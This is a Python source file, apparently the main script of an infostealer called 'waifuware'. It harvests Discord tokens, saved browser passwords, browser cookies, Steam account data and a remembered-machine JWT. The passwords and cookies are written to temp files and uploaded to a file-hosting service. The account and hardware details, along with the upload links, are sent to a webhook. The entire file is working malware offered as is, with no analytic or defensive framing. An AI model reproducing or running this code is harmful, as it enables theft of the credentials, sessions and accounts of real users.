from concurrent.futures import ThreadPoolExecutor

from target.discord import GetDiscordTokens
from target.passwords import GetBrowsersPasswords, Password
from target.cookies import GetBrowsersCookies, Cookie
from target.steam import GetSteamAccount, GetSteamRemoteClients, GetRememberedMachineJWT
from hardware.Hardware import Hardware

from checks.discord import Discord

from typing import List
from utils.gofile import UploadFile
from os import getenv
from os.path import join

from webhook.Webhook import Webhook


def processTokens(toucan, web: Webhook, hard: Hardware, links: List[str]):
    try:
        user = Discord(toucan).GetUser()
        web.DiscordAccountWebhook(user, hard, links)
    except ValueError:
        pass


def ProcessBrowsers(passw: List[Password], cks: List[Cookie]) -> List[str]:
    temp = getenv("TEMP")
    passdir = join(temp, "passwords.waifuware")
    cookdir = join(temp, "cookies.waifuware")
    passtext = ""
    cookietext = ""
    passfile = open(passdir, "w")
    cookfile = open(cookdir, "w")
    for p in passw:
        passtext += f"{p.site} : {p.username} : {p.password}\n"
    passfile.write(passtext)
    for c in cks:
        cookietext += f"{c.site} : {c.key} : {c.value}\n"
    cookfile.write(cookietext)
    passfile.close()
    cookfile.close()
    try:
        return [
            UploadFile(passdir),
            UploadFile(cookdir)
        ]
    except ConnectionError:
        pass


if __name__ == '__main__':
    with ThreadPoolExecutor(7) as executor:
        tokenfuture = executor.submit(GetDiscordTokens)
        passwordsfuture = executor.submit(GetBrowsersPasswords)
        cookiesfuture = executor.submit(GetBrowsersCookies)
        steamaccfuture = executor.submit(GetSteamAccount)
        steamclientsfuture = executor.submit(GetSteamRemoteClients)
        steamjwtfuture = executor.submit(GetRememberedMachineJWT)
    tokens = tokenfuture.result()
    passwords = passwordsfuture.result()
    cookies = cookiesfuture.result()
    steamacc = steamaccfuture.result()
    steamclients = steamclientsfuture.result()
    steamjwt = steamjwtfuture.result()
    links = ProcessBrowsers(passwords, cookies)
    webhook = Webhook("webhook")
    hardware = Hardware()
    with ThreadPoolExecutor() as executor:
        for token in tokens:
            executor.submit(processTokens, token, webhook, hardware, links)
